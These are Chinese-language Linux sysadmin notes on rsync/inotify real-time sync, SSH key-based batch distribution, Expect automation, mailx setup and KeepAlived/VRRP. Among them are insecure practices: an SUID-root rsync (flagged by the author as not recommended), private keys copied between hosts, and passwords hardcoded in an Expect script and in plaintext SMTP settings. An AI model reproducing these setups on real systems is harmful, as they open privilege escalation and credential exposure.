	#+BEGIN_SRC sh
crontab -e
00 01 * * * /bin/sh /server/scripts/bak.sh >/dev/null 2>&1
	#+END_SRC
** 实时数据同步之inotify
   目标：实时同步NFS服务端的数据到rsync热备服务器。需要在NFS服务端安装
   inotify或sersync软件。

   NFS服务器的数据共享目录为/data；rsync热备服务器的数据目录为/backup。

   在NFS服务端让inotify或sersync监控/data目录的变化，

   演示环境：
   | 主机名       |             IP | 说明            |
   |--------------+----------------+-----------------|
   | nfs-server   | 192.168.56.101 | NFS服务端       |
   | rsync-server | 192.168.56.199 | rsync热备服务器 | 

   接下来在nfs-server上安装inotify-tools工具，可以通过yum或源码方式安
   装。这里使用yum的方式进行安装，yum源的版本为3.14。
   #+BEGIN_SRC sh
yum install -y inotify-tools
# 查看inotify-tools安装了哪些文件
rpm -ql inotify-tools
/usr/bin/inotifywait
/usr/bin/inotifywatch
/usr/lib64/libinotifytools.so.0
/usr/lib64/libinotifytools.so.0.4.1
/usr/share/doc/inotify-tools-3.14
/usr/share/doc/inotify-tools-3.14/AUTHORS
/usr/share/doc/inotify-tools-3.14/COPYING
/usr/share/doc/inotify-tools-3.14/ChangeLog
/usr/share/doc/inotify-tools-3.14/NEWS
/usr/share/doc/inotify-tools-3.14/README
/usr/share/man/man1/inotifywait.1.gz
/usr/share/man/man1/inotifywatch.1.gz
   #+END_SRC
   
   安装完毕，系统会多出两个命令，分别为inotifywait和inotifywatch。
*** inotify工具介绍
	一共安装了两个命令，分别为inotifywait和inotifywatch。

	inotifywait：在被监控的文件或目录上等待特定文件系统事件（open、
	close、delete等）发生，执行后处于阻塞状态，适合在shell脚本中使用。

	inotifywatch：收集被监视的文件系统使用度统计数据，指文件系统事件发
	生的次数统计。
**** inotifywait常用参数详解
	 #+BEGIN_SRC sh
# inotifywait --help
inotifywait 3.14
Wait for a particular event on a file or set of files.
Usage: inotifywait [ options ] file1 [ file2 ] [ file3 ] [ ... ]
Options:
	@<file>       	Exclude the specified file from being watched.
	--exclude <pattern> 
	              	Exclude all events on files matching the
	              	extended regular expression <pattern>.
	--excludei <pattern> # 排除文件或目录时，不区分大小写
	              	Like --exclude but case insensitive.
	-m|--monitor  	Keep listening for events forever.  Without # 始终保持事件监听状态
	              	this option, inotifywait will exit after one
	              	event is received.
	-d|--daemon   	Same as --monitor, except run in the background
	              	logging events to a file specified by --outfile.
	              	Implies --syslog.
	-r|--recursive	Watch directories recursively. # 递归查询目录
	--fromfile <file>
	              	Read files to watch from <file> or `-' for stdin.
	-o|--outfile <file>
	              	Print events to <file> rather than stdout.
	-s|--syslog   	Send errors to syslog rather than stderr.
	-q|--quiet    	Print less (only print events). # 打印很少的信息，仅仅打印监控事件的信息
	-qq           	Print nothing (not even events).
	--format <fmt>	Print using a specified printf-like format
	              	string; read the man page for more details.
	--timefmt <fmt>	strftime-compatible format string for use with
	              	%T in --format string. # 指定时间输出格式
	-c|--csv      	Print events in CSV format.
	-t|--timeout <seconds>
	              	When listening for a single event, time out after
	              	waiting for an event for <seconds> seconds.
	              	If <seconds> is 0, inotifywait will never time out.
	-e|--event <event1> [ -e|--event <event2> ... ] # 监听哪些事件
		Listen for specific event(s).  If omitted, all events are 
		listened for.

Exit status:
	0  -  An event you asked to watch for was received.
	1  -  An event you did not ask to watch for was received
	      (usually delete_self or unmount), or some error occurred.
	2  -  The --timeout option was given and no events occurred
	      in the specified interval of time.

Events:
	access		file or directory contents were read
	modify		file or directory contents were written
	attrib		file or directory attributes changed
	close_write	file or directory closed, after being opened in
	           	writeable mode
	close_nowrite	file or directory closed, after being opened in
	           	read-only mode
	close		file or directory closed, regardless of read/write mode
	open		file or directory opened
	moved_to	file or directory moved to watched directory
	moved_from	file or directory moved from watched directory
	move		file or directory moved to or from watched directory
	create		file or directory created within watched directory
	delete		file or directory deleted within watched directory
	delete_self	file or directory was deleted
	unmount		file system containing file or directory unmounted
	 #+END_SRC

	 手工进行演示，
	 #+BEGIN_SRC sh
# 在一个终端执行如下命令
inotifywait  -mrq --timefmt '%d/%m/%y %H:%M' --format '%T %w%f' -e create /data
# 在另外一个终端创建文件
cd /data
touch lavenliu.txt
	 #+END_SRC

	 常用的事件create、close_write、delete，相当于增删改，
	 #+BEGIN_SRC sh
inotifywait -mrq --format '%w%f' -e create,close_write,delete /data
	 #+END_SRC

	 来一个完整的脚本，
	 #+BEGIN_SRC sh
cat /server/scripts/inotify01.sh
#!/usr/bin/env bash

INOTIFY=/usr/bin/inotifywait
${INOTIFY} -mrq --format '%w%f' -e create,close_write,delete /data |while read file
do
    cd / && \
        rsync -az ./data --delete rsync_backup@192.168.56.199::backup/ \
              --password-file=/etc/rsync.password
done
	 #+END_SRC

	 这种场景满足10-300K这样的小文件，200-300并发以内的同步，基本不会
	 有延迟。大于这种并发的需求，可以考虑drbd的方案，或考虑程序双写的
	 方案或分布式文件系统。
**** inotify实时同步优化
	 关键参数说明：
	 
	 在/proc/sys/fs/inotify目录下有三个文件，对inotify机制有一定的限制，
	 #+BEGIN_EXAMPLE
	 max_user_watches: 设置inotifywait或inotifywatch命令可以监视的文件数量（进程）。
	 max_user_instances: 设置每个用户可以运行的inotifywait或inotifywatch命令的进程数。
	 max_queued_events: 设置inotify实例事件（event）队列可容纳的事件数量。
	 #+END_EXAMPLE

	 查看以下几个值，
	 #+BEGIN_SRC sh
[root@python scripts]# cat /proc/sys/fs/inotify/max_user_watches 
8192
[root@python scripts]# cat /proc/sys/fs/inotify/max_user_instances 
128
[root@python scripts]# cat /proc/sys/fs/inotify/max_queued_events 
16384
# 设置这些值
echo "50000000" > /proc/sys/fs/inotify/max_user_watches
echo "50000000" > /proc/sys/fs/inotify/max_queued_events
	 #+END_SRC
**** inotify优缺点
	 优点：
	 #+BEGIN_EXAMPLE
	 结合rsync实现实时数据同步
	 #+END_EXAMPLE

	 缺点：
	 #+BEGIN_EXAMPLE
	 1. 并发如果大于200个文件（10-100K），同步就会有延迟
	 2. 每次都是全程推送，但确实是增量的
	 3. 监控到事件后，调用rsync同步是单进程的，sersync多进程同步。
	    sersync功能多：
	    1. 配置文件
	    2. 真正的守护进程
	    3. 可以对失败文件定时重传
	    4. 第三方的HTTP接口
	    5. 默认多线程同步
	 #+END_EXAMPLE
** 高并发数据实时同步方案小结
   1. inotify（sersync）+rsync文件级别同步
   2. drbd 文件系统级别
   3. 第三方软件的同步功能
   4. 程序双写
   5. 业务逻辑解决
** rsync企业案例
   某公司有一台Web服务器，里面的数据很重要，但是如果硬盘坏了，数据就会
   丢失，现在领导要求你把数据在其他机器上做一个周期性定时备份。要求如
   下：
   #+BEGIN_EXAMPLE
   每天晚上00点整在web服务器A上打包备份网站程序目录并通过rsync命令推送
   到服务器B上备份保留（备份思路可以是先在本地按日期打包，然后再推送到
   备份服务器上）。
   #+END_EXAMPLE

   具体要求如下：
   1. web服务器A和备份服务器B的备份目录必须都为/backup
   2. web服务器站点目录假定为(/var/www/html)
   3. web服务器本地仅保留7天内的备份
   4. 备份服务器上检查备份结果是否正常，并将每天的备份结果发给管理员邮箱（选做）
   5. 备份服务器上每周六的数据都保留，其他备份仅保留180天备份（选做）
** 常见问题或故障处理
*** Connection refused
	要么rsync服务端没有启动，或者防火墙阻挡等问题。
*** auth failed on module ...
	#+BEGIN_EXAMPLE
# rsync -avz rsync_backup@192.168.56.199::backup /tmp/ \
>   --password-file=/etc/rsync.password
@ERROR: auth failed on module backup
rsync error: error starting client-server protocol (code 5) at main.c(1503) [receiver=3.0.6]
	#+END_EXAMPLE
	
	主要原因是/etc/rsync.password文件内容写的有问题。我这里是把
	rsync-server端的/etc/rsync.password复制过来了。在rsync-client端的
	正确的/etc/rsync.password内容应该是只有密码而不包含用户名。

	*配置文件有多余的空格也会有问题*
*** password file must not be other-accessible
	主要是/etc/rsync.password的配置文件权限导致的。正确的权限是600。
	#+BEGIN_SRC sh
chmod 600 /etc/rsync.password
	#+END_SRC
*** chdir failed
	可能是服务端的共享目录不存在。
*** 注意斜线问题
	服务端配置：
	#+BEGIN_SRC sh
path = /backup/
	#+END_SRC

	客户端指令：
	#+BEGIN_SRC sh
rsync -avz /tmp/ rsync_backup@192.168.56.199::backup/ \
	  --password-file=/etc/rsync.password
	#+END_SRC
*** 同步安全优化
	#+BEGIN_SRC sh
--address # 绑定指定IP地址提供服务
rsync --daemon --address=192.168.56.199
	#+END_SRC
* SSH
** SSH介绍
   官网
** SSH结构
   SSH服务由服务端软件OpenSSH（openssl）和客户端（常见的客户端有
   SecureCRT、Putty、XShell）组成。SSH服务默认使用22端口提供服务，它有
   两个不兼容的SSH协议版本，分别是1.x和2.x。

   #+BEGIN_SRC sh
rpm -qa openssh
openssh-5.3p1-112.el6_7.x86_64
   #+END_SRC

   在SSH 1.x的联机过程中，当Server接受Clinet端的Private key后，就不再
   针对该联机的Key pair进行检验。此时若有恶意黑客针对该联机的Key pair
   对插入恶意的程序代码时，由于服务端不会再检验联机的正确性，因此可能
   会接收该程序代码，从而造成系统被黑掉的问题。

   为了改正这个缺点，SSH version 2多加了一个确认联机正确性的
   Diffie-Hellman机制，在每次数据传输中，Server都会以该机制检查数据的
   来源是否正确，这样，可以避免联机过程中被插入恶意程序代码的问题。

   可以查看当前SSH使用的协议版本，CentOS5系列和CentOS6系列，默认的协议
   版本是2版本，
   #+BEGIN_SRC sh
grep Protocol /etc/ssh/sshd_config
Protocol 2
   #+END_SRC
** ssh服务认证类型
*** 基于口令的安全验证
	基于口令的安全验证的方式是我们一直在用的。只要知道服务器的ssh连接
	账号和口令，就可以通过ssh客户端登录到这台远程主机。此时，联机过程
	中所有传输的数据都是加密的。
	
	#+BEGIN_SRC sh
ssh -p 22 root@192.168.56.199
Last login: Mon Mar  7 01:08:53 2016 from 192.168.56.1
[root@rsync-server ~]# logout
Connection to 192.168.56.199 closed.
	#+END_SRC
*** 基于密钥的安全验证
	基于密钥的安全验证方式是指，需要依靠密钥，也就是必须事先建立一对密
	钥对，然后把公用密钥（Public Key）放在需要访问的目标服务器上，另外，
	还需要把私有密钥（Private Key）放到SSH的客户端或对应的客户端服务器
	上。

	此时，如果要想连接到这个带有公用密钥的SSH服务器，客户端SSH软件或者
	客户端服务器就会向SSH服务器发出请求，请求用联机的用户密钥进行安全
	验证。SSH服务器收到请求后，会先在该SSH服务器上连接的用户的家目录下
	寻找事先放上去的对用用户的公用密钥，然后把它和连接的SSH客户端发送
	过来的公用密钥进行比较。如果两个密钥一致，SSH服务器就用公用密钥加
	密“质询”（challenge）并把它发送给SSH客户端。

	SSH客户端收到“质询”之后就可以用自己的私钥解密，再把它发送给SSH服务
	器。使用这种方式，需要知道联机用户的密钥文件。与第一种基于口令的验
	证方式相比，第二种方式不需要在网络上传送口令密码，所以安全性更高了，
	这时我们也要注意保护我们的密钥文件，特别是私钥文件，一旦被黑客获取，
	危险就大了。
** ssh及scp及sftp介绍
   scp知识小结：
   1. scp是加密的远程拷贝，而cp是本地的拷贝
   2. 可以把数据从一台机器推送到另一台机器，也可以从其他服务器把数据拉取到本地。
   3. 每次都是全量的拷贝，因此，效率不高；适合第一次拷贝用，如果需要增量拷贝，用rsync。

   #+BEGIN_SRC sh
sftp -oPort=22 root@192.168.56.199
Connecting to 192.168.56.199...
sftp> put main.c
Uploading main.c to /root/main.c
main.c                                                                                             100%  313     0.3KB/s   00:00    
sftp> ls
Zillion                          anaconda-ks.cfg                  anaconda-ks.txt                  apache-maven-3.3.3-bin.tar.gz    
demos                            hosts                            install.log                      install.log.syslog               
main.c                           tab.py                           tab.pyc                          xxx.sh                           
sftp> !ls
a.out  bug.c  factorial.c  hello2.C  hello.C  main.c
sftp> ls
Zillion                          anaconda-ks.cfg                  anaconda-ks.txt                  apache-maven-3.3.3-bin.tar.gz    
demos                            hosts                            install.log                      install.log.syslog               
main.c                           tab.py                           tab.pyc                          xxx.sh                           
sftp> cat hosts
Invalid command.
sftp> get hosts
Fetching /root/hosts to hosts
/root/hosts                                                                                        100%   30     0.0KB/s   00:00    
sftp> ls
Zillion                          anaconda-ks.cfg                  anaconda-ks.txt                  apache-maven-3.3.3-bin.tar.gz    
demos                            hosts                            install.log                      install.log.syslog               
main.c                           tab.py                           tab.pyc                          xxx.sh                           
sftp>
   #+END_SRC
** ssh小结
   1. ssh为加密的远程连接协议，相关的软件由openssh和openssl组成
   2. 默认端口为22
   3. 协议版本有1.x和2.x。2.x更安全。
   4. 服务端ssh开机要启动
   5. ssh客户端包含ssh、scp、sftp
   6. ssh安全验证方式：口令和密钥。ssh密钥登录原理
   7. ssh服务安全优化，修改默认的22端口，禁止root远程连接，禁止DNS解析，ssh只监听内网IP
   8. ssh密钥对，公钥在服务器端，比喻就是锁，私钥放在客户端，比喻就是钥匙。
** 集群架构批量分发管理方案
   所有机器的/etc/hosts文件要一致。主机名是"uname -n"得到的主机名。

   演示环境：
   | 主机名         |             IP | 说明           |
   |----------------+----------------+----------------|
   | python         | 192.168.56.101 | 分发服务器     |
   | rsync-server   | 192.168.56.199 | 被分发服务器01 |
   | rsync-client01 | 192.168.56.200 | 被分发服务器02 | 

   批量目标：
   1. 批量分发
   2. 批量部署
   3. 批量配置管理

   IT公司企业级批量分发/管理方案：
   1. 中小企业最基本实用的SSHKEY密钥的方案
   2. 门户网站Puppet，cfengine
   3. saltstack

   运维原则：简单、易用、高效
*** 开始动手分发实践(正向无密码登录)
	演示环境：
    | 主机名         |             IP | 说明           |
    |----------------+----------------+----------------|
    | python         | 192.168.56.101 | 分发服务器     |
    | rsync-server   | 192.168.56.199 | 被分发服务器01 |
    | rsync-client01 | 192.168.56.200 | 被分发服务器02 | 

	使用lavenliu用户进行分发。

	#+BEGIN_SRC sh
[lavenliu@python ~]$ ssh-keygen -t dsa
Generating public/private dsa key pair.
Enter file in which to save the key (/home/lavenliu/.ssh/id_dsa): 
Created directory '/home/lavenliu/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/lavenliu/.ssh/id_dsa. # 产生的私钥
Your public key has been saved in /home/lavenliu/.ssh/id_dsa.pub. # 产生的公钥
The key fingerprint is:
3f:56:4c:2c:04:02:32:de:b2:cd:4b:6e:c5:f0:1d:ac lavenliu@python
The key's randomart image is:
+--[ DSA 1024]----+
|  o ... ...      |
| . +   o . .     |
|  o o   o . o    |
|   = + o . +     |
|  . + E S   o    |
|   o o   . .     |
|    +     +      |
|   .     . .     |
|                 |
+-----------------+
[lavenliu@python ~]$ ll .ssh/
total 8
-rw------- 1 lavenliu lavenliu 668 Mar  7 15:12 id_dsa
-rw-r--r-- 1 lavenliu lavenliu 605 Mar  7 15:12 id_dsa.pub
[lavenliu@python ~]$ ssh-copy-id -i .ssh/id_dsa.pub lavenliu@192.168.56.199
The authenticity of host '192.168.56.199 (192.168.56.199)' can't be established.
RSA key fingerprint is 23:7d:2a:d1:23:42:9b:85:2b:20:07:b2:05:6a:d9:f8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.199' (RSA) to the list of known hosts.
lavenliu@192.168.56.199's password: 
Now try logging into the machine, with "ssh 'lavenliu@192.168.56.199'", and check in:

  .ssh/authorized_keys

to make sure we haven't added extra keys that you weren't expecting.

[lavenliu@python ~]$ ssh-copy-id -i .ssh/id_dsa.pub lavenliu@192.168.56.200
The authenticity of host '192.168.56.200 (192.168.56.200)' can't be established.
RSA key fingerprint is 23:7d:2a:d1:23:42:9b:85:2b:20:07:b2:05:6a:d9:f8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.200' (RSA) to the list of known hosts.
lavenliu@192.168.56.200's password: 
Now try logging into the machine, with "ssh 'lavenliu@192.168.56.200'", and check in:

  .ssh/authorized_keys

to make sure we haven't added extra keys that you weren't expecting.

[lavenliu@python ~]$ ssh lavenliu@192.168.56.199 /sbin/ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 08:00:27:35:1C:38  
          inet addr:10.0.2.15  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe35:1c38/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5711 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3595 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:6454740 (6.1 MiB)  TX bytes:212439 (207.4 KiB)

[lavenliu@python ~]$ ssh lavenliu@192.168.56.200 /sbin/ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 08:00:27:83:50:72  
          inet addr:10.0.2.15  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe83:5072/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:346 errors:0 dropped:0 overruns:0 frame:0
          TX packets:585 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:31532 (30.7 KiB)  TX bytes:44603 (43.5 KiB)
	#+END_SRC

	命令解释：
	#+BEGIN_SRC sh
ssh-copy-id -i .ssh/id_dsa.pub lavenliu@192.168.56.199
# 执行上述命令后，具体做了哪些工作？
# public key:
# 
# id_dsa.pub --> authorized_keys
# 还有注意authorized_keys的权限问题，是600的权限。
# .ssh目录的权限是700
	#+END_SRC

	此时，可以做成一个批量分发的脚本，
	#+BEGIN_SRC sh
cat fenfa01.sh
#!/usr/bin/env bash

cd /home/lavenliu
scp -P22 hosts lavenliu@192.168.56.199:~
scp -P22 hosts lavenliu@192.168.56.200:~
# 执行该脚本
[lavenliu@python ~]$ bash fenfa01.sh 
hosts                                                           100%  335     0.3KB/s   00:00    
hosts                                                           100%  335     0.3KB/s   00:00
	#+END_SRC

	第二版分发脚本，
	#+BEGIN_SRC sh
[lavenliu@python ~]$ cat fenfa02.sh 
#!/bin/bash

. /etc/init.d/functions

if [ $# -ne 1 ] ; then
	echo "Usage: $0 { /path/to/file | /path/to/dir }"
	exit 1
fi

for i in 199 200
do
	scp -r -P22 $1 lavenliu@192.168.56.${i}:~ &>/dev/null
	if [ $? -ne 0 ] ; then
		action "fenfa $1 failure" /bin/false
	else
		action "fenfa $1 successful" /bin/true
	fi
done
# 执行该脚本
[lavenliu@python ~]$ bash fenfa02.sh hosts
fenfa hosts successful                                     [  OK  ]
fenfa hosts successful                                     [  OK  ]
	#+END_SRC

	一个执行远程命令的脚本，
	#+BEGIN_SRC sh
[lavenliu@python ~]$ cat view1.sh 
#!/bin/bash

. /etc/init.d/functions

if [ $# -ne 1 ] ; then
    echo "Usage: $0 command"
    exit 1
fi

for i in 199 200; do
    ssh -p22 lavenliu@192.168.56.${i} $1
    if [ $? -ne 0 ]; then
        action "no such command" /bin/false
    fi
done
	#+END_SRC
*** 逆向无密码登录
	#+BEGIN_SRC sh
[lavenliu@python ~]$ scp -p .ssh/id_dsa lavenliu@192.168.56.199:~/.ssh
id_dsa                                                                                             100%  668     0.7KB/s   00:00    
[lavenliu@python ~]$ scp -p .ssh/id_dsa lavenliu@192.168.56.200:~/.ssh
id_dsa
[lavenliu@python ~]# ssh-copy-id -i ~/.ssh/id_dsa lavenliu@192.168.56.200
#############
[lavenliu@rsync-client01 ~]$ ssh lavenliu@192.168.56.101 /sbin/ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 08:00:27:61:76:1E  
          inet addr:192.168.56.101  Bcast:192.168.56.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe61:761e/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2719 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2117 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:317618 (310.1 KiB)  TX bytes:351340 (343.1 KiB)
	#+END_SRC
*** ssh批量分发与管理方案
	1. 利用root做ssh key验证
	   #+BEGIN_EXAMPLE
	   优点：简单，易用
	   缺点：安全差，同时无法禁止root远程连接这个功能
	   企业应用：80%的中小企业
	   #+END_EXAMPLE
	2. 利用普通用户如lavenliu来做
	   #+BEGIN_EXAMPLE
	   思路是先把分发的文件拷贝到服务器用户家目录，
	   然后sudo提权拷贝分发的文件到对应权限的目录。
	   优点：安全。无需停止root远程连接这个功能。
	   缺点：配置比较复杂。
	   #+END_EXAMPLE
**** ssh批量分发之sudo方案(建议的方案，sudo可以定位到用户)
	 在所有的机器上设置，
	 #+BEGIN_SRC sh
echo 'lavenliu ALL=(ALL) NOPASSWD:/usr/bin/rsync' >> /etc/sudoers
visudo -c
grep lavenliu /etc/sudoers
	 #+END_SRC

	 在分发机器上进行操作：
	 #+BEGIN_SRC sh
# 首先在分发机器上把hosts文件，远程复制到192.168.56.199的lavenliu家目录
scp -P22 -r hosts lavenliu@192.168.56.199:~
hosts                                                           100%  335     0.3KB/s   00:00
# 然后，使用sudo，让lavenliu把家目录下的hosts文件，同步到/etc/目录下
ssh -t lavenliu@192.168.56.199 sudo rsync hosts /etc/
	 #+END_SRC

	 写成一个脚本的形式，
	 #+BEGIN_SRC sh
[lavenliu@python ~]$ cat fenfa_good.sh 
#!/bin/bash

. /etc/init.d/functions

NETWORK_PREFIX=192.168.56

if [ $# -ne 2 ] ; then
	echo "Usage: $0 { /local/path/to/file | /remote/path/to/dir }"
	exit 1
fi

for i in 199 200
do
	scp -r -P22 $1 lavenliu@${NETWORK_PREFIX}.${i}:~ &>/dev/null && \
	ssh -t lavenliu@${NETWORK_PREFIX}.${i} sudo rsync $1 $2 &>/dev/null
	if [ $? -ne 0 ] ; then
		action "distribute $1 to ${NETWORK_PREFIX}.${i} failure" /bin/false
	else
		action "distribute $1 to ${NETWORK_PREFIX}.${i} successful" /bin/true
	fi
done
	 #+END_SRC
**** ssh批量分发之suid方案(不建议的方案，rsync可以删除文件)
	 在被分发的机器上做如下操作，
	 #+BEGIN_SRC sh
chmod 4755 /usr/bin/rsync
ll `which rsync`
	 #+END_SRC

	 在分发服务器上，执行，
	 #+BEGIN_SRC sh
scp -P22 -r hosts lavenliu@192.168.56.199:~
ssh -t lavenliu@192.168.56.199 rsync ~/hosts /etc/
	 #+END_SRC
* Expect
  一些命令：
  1. spawn			(starts a process)
  2. send			(sends to a process)
  3. expect			(waits for output from a process)
  4. interact		(let us interact with a process)
  5. send_user		(output that gets sent to stdout)
  6. log_user		(By default all process output shows up on stdout)
  7. exp_internal	(Expect debug log mode)
  8. set            (set variables in Tcl and thus Expect)
  9. close          (close the connection to the current process)

  expect如何工作：
  #+BEGIN_EXAMPLE
  与其他脚本语言（如bash，perl等）一样，需要在文件开头写上"#!/usr/bin/expect"，
  并在其下写其他命令。expect是Tcl脚本语言的扩展，所以expect使用的语法格式与Tcl
  是完全一样的。

  大多数的expect脚本是通过spawn命令来创建一个进程，然后随之与之交互。
  比如"spawn ssh user@host"或者"spawn ftp host"。然后我们就可以通过expect
  命令来检查刚新建进程的输出，Expect使用正则的方式在输出中寻找匹配的内容，
  一旦有匹配，Expect就会使用send命令与之交互。这就是Expect最简单的工作方式。
  #+END_EXAMPLE

  获得帮助，
  #+BEGIN_SRC sh
ptroff -man expect.man
ditroff -man expect.man
  #+END_SRC

  一个脚本，
  #+BEGIN_SRC sh
yum install -y expect
which expect

[taoqi@python ~]$ cat fenfa_sshkey.exp 
#!/usr/bin/expect

if { $argc != 2 } {
    send_user "usage: expect fenfa_sshkey.exp file host\n"
    exit
}

# define var
set file [lindex $argv 0]
set host [lindex $argv 1]
set password "111111"

spawn ssh-copy-id -i $file "-p 22 taoqi@$host"
expect {
    "yes/no"    { send "yes\r"; exp_continue }
    "*password" { send "$password\r" }
}
expect eof

[taoqi@python ~]$ expect  fenfa_sshkey.exp ~/.ssh/id_dsa.pub 192.168.56.199
spawn ssh-copy-id -i /home/taoqi/.ssh/id_dsa.pub -p 22 taoqi@192.168.56.199
The authenticity of host '192.168.56.199 (192.168.56.199)' can't be established.
RSA key fingerprint is 23:7d:2a:d1:23:42:9b:85:2b:20:07:b2:05:6a:d9:f8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.199' (RSA) to the list of known hosts.
taoqi@192.168.56.199's password: 
Now try logging into the machine, with "ssh '-p 22 taoqi@192.168.56.199'", and check in:

  .ssh/authorized_keys

to make sure we haven't added extra keys that you weren't expecting.

[taoqi@python ~]$ expect  fenfa_sshkey.exp ~/.ssh/id_dsa.pub 192.168.56.200
spawn ssh-copy-id -i /home/taoqi/.ssh/id_dsa.pub -p 22 taoqi@192.168.56.200
The authenticity of host '192.168.56.200 (192.168.56.200)' can't be established.
RSA key fingerprint is 23:7d:2a:d1:23:42:9b:85:2b:20:07:b2:05:6a:d9:f8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.200' (RSA) to the list of known hosts.
taoqi@192.168.56.200's password: 
Now try logging into the machine, with "ssh '-p 22 taoqi@192.168.56.200'", and check in:

  .ssh/authorized_keys

to make sure we haven't added extra keys that you weren't expecting.
  #+END_SRC
* Mail
  linux发邮件2种常见客户端命令
  #+BEGIN_SRC sh
mail -s "subject" to_mail_address@xxx.com < mail_body
mail -s "subject" to_mail_address@xxx.com < /etc/hosts
echo "mail_body" |mail -s "subject" to_mail_address@xxx.com
  #+END_SRC

  或者使用sendemail工具，一个Perl的脚本。

  #+BEGIN_SRC sh
yum install -y mailx
echo "# set mail #" >> /etc/mail.rc
echo "set from=liulaven@sina.com smtp=smtp.sina.com" >> /etc/mail.rc
echo "set smtp-auth-user=liulaven smtp-auth-password=lavenliu smtp-auth=login" >> /etc/mail.rc
  #+END_SRC
* KeepAlived
** KeepAlived高可用服务介绍
   KeepAlived起初是专为LVS设计的，专门用来监控LVS集群系统中各个服务节
   点的状态，后来又加入了VRRP的功能，因此，除了配合LVS服务外，也可以作
   为其他服务（如Nginx，HAProxy等）的高可用软件。VRRP是Virtual Router
   Redundancy Protocol（虚拟路由冗余协议）的缩写，VRRP出现的目的就是为
   了解决静态路由出现的单点故障问题，它能够保证网络的不间断、稳定地运
   行。所以，KeepAlived一方面具有LVS cluster nodes healthcheck功能，另
   一方面也具有LVS directors failover功能。
*** LVS directors failover功能
	HA failover功能： 实现LB Master主机和LB Backup主机之间故障转移和自
	动切换。这是针对有两个负载均衡器Directors同时工作时而采取的故障转移
	措施。当主负载均衡器失效或出现故障时，备份负载均衡器将自动接管主负
	载均衡器的所有工作（VIP资源及相应服务）；一旦主负载均衡器故障修复，
	主负载均衡器又会接管它原来处理的工作，而备份负载均衡器会释放主负载
	均衡器失效时它接管的工作，此时两者将恢复到最初各自的角色状态。

	LVS directors failover功能原理图
*** LVS cluster nodes healthchecks功能
	RS healthcheck功能： 负载均衡器定期检查RS的可用性决定是否给其分发
	请求。当虚拟服务器中的某一个甚至是几个真实服务器同时发生故障而无法
	提供服务时，负载均衡器会自动将失效的RS服务器从转发队列中剔除，从而
	保证用户的访问不受影响；当故障的RS服务器被修复后，系统又会自动把它
	们加入到转发队列中，进而又可以继续提供服务。
** KeepAlived高可用服务原理详解
*** KeepAlived故障切换转移原理
	KeepAlived Directors高可用之间的故障切换转移，是通过VRRP协议来实现
	的。

	在KeepAlived Directors正常工作时，主Directors节点会不断的向备节点
	广播心跳消息，用以告诉备节点自己还活着，当主节点发生故障时，备节点
	就无法继续检测到主节点的心跳信息，进而调用自身的接管程序，接管主节
	点的IP资源及服务。当主节点恢复故障时，备节点会释放主节点故障时自身
	接管的IP资源及服务，恢复到原来的自身的备用角色。
*** VRRP协议简单介绍
	VRRP协议，全称是Virtual Router Redundancy Protocol，中文是虚拟路由
	冗余协议，VRRP的出现就是为了解决静态路由的单点故障问题，VRRP是通过
	一种竞选机制来将路由任务交给某台支持VRRP协议的路由器。
*** MASTER和BACKUP
	在一个VRRP虚拟路由器中，有多台物理的VRRP路由器，但是这么多台物理的
	机器并不同时工作，而是由一台称为MASTER的路由器进行工作，其他的都是
	BACKUP角色。MASTER并不是一直担任主角色，由于VRRP协议让每个VRRP路由
	器都参与竞选，最终获胜（高优先级）的就是MASTER。MASTER有一些特权，
	比如，拥有虚拟路由器的IP地址，我们的主机就是利用这个IP地址作为静态
	路由的。拥有特权的MASTER要负责转发发送给网关地址的包和响应ARP请求。

	VRRP通过竞选机制来实现虚拟路由器的功能，所有的协议报文都是通过IP多
	播包（多播地址224.0.0.18）形式发送的。虚拟路由器由VRID（范围0-255）
	和一组IP地址组成，对外表现为一个周知的MAC地址：
	00-00-5E-00-01-{VRID}。所以，在一个虚拟路由器中，不管谁是MASTER，
	对外都是相同的MAC和IP（称之为VIP）。客户端主机并不需要因为MASTER的
	改变而修改自己的路由配置，对用户来说，这种主从的切换是透明的。

	在一个虚拟路由器中，只有作为Master的VRRP路由器会一直发送VRRP广播包
	（VRRP Advertisement message），BACKUP不会抢占MASTER，除非它的优先
	级（priority）更高。当Master不可用时（Backup接收不到广播包），多台
	BACKUP中优先级最高的会被提升为MASTER。这种切换是非常快速的（小于
	1s），以保证服务的连续性。
*** VRRP工作原理总结
	1. VRRP协议（Virtual Router Reduntancy Protoco），虚拟路由冗余协议，
       是为了解决静态路由的单点故障问题的。
	2. VRRP通过一种竞选机制来将路由任务交给某台VRRP路由器。
	3. VRRP通信是用IP多播的方式实现通信。
	4. 主节点发包，备节点接收包。备节点收不到来自主的包的时候，会接管
       主的资源。备节点可以有多个，通过优先级竞选。
	5. VRRP协议使用了加密协议。
*** KeepAlived工作原理总结
	KeepAlived高可用之间是通过VRRP协议通信的，VRRP协议通过竞选机制来确
	定主备的，主的优先级高于备，因此，工作时主会获得所有的资源，备节点
	则处于等待状态，当主故障时，备节点接管主节点的资源，然后替代主节点
	对外提供服务。

	VRRP协议通过IP多播（224.0.0.18）的方式发送的。

